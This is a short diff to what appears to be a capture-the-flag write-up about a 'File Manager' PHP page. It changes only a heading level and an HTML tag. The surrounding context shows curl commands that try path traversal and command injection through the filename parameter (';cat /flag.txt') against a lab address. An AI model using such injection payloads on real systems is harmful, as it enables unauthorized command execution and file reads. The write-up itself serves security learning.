@@ -71,7 +71,7 @@ curl -I -X HEAD "http://83.136.253.201:36762/index.php?filename=../../flag.txt"
 
 
 
-### malicious payload
+## malicious payload
 
 ```
 curl -X GET "http://83.136.253.201:36762/index.php?filename=;cat+/flag.txt"
@@ -79,7 +79,7 @@ curl -X GET "http://83.136.253.201:36762/index.php?filename=;cat+/flag.txt"
 ```
 <body>
     <div class="form-group">
-        <h1>File Manager</h1>
+        <h>File Manager</h>
         <form role="form" action="index.php" method="GET">
             <input type="text" class="form-control" placeholder="New File Name" name="filename">
         </form>
